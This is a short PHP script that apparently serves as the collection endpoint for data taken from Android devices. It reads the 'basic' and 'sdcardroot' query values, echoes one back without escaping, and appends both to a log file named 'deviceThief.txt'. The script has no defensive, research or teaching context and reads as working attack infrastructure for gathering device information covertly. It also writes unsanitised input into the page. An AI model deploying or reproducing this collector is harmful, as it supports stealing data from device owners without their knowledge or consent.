<?php
header('Content-Type: text/html;charset=UTF-8');
$d1=$_GET["basic"];
$d2=$_GET["sdcardroot"];

echo "<br>";
echo "AndroidVer= " .$d1;

if(filesize('deviceThief.txt') >= 500000)
{
    file_put_contents('deviceThief.txt', "");
}

file_put_contents('deviceThief.txt', PHP_EOL, FILE_APPEND);
file_put_contents('deviceThief.txt', PHP_EOL, FILE_APPEND);
file_put_contents('deviceThief.txt', PHP_EOL, FILE_APPEND);

file_put_contents('deviceThief.txt', "Basic= " .$d1 .PHP_EOL, FILE_APPEND);

file_put_contents('deviceThief.txt', "sdcardRoot= " .$d2 .PHP_EOL, FILE_APPEND);

file_put_contents('deviceThief.txt', "----------------------------" .PHP_EOL, FILE_APPEND);

?>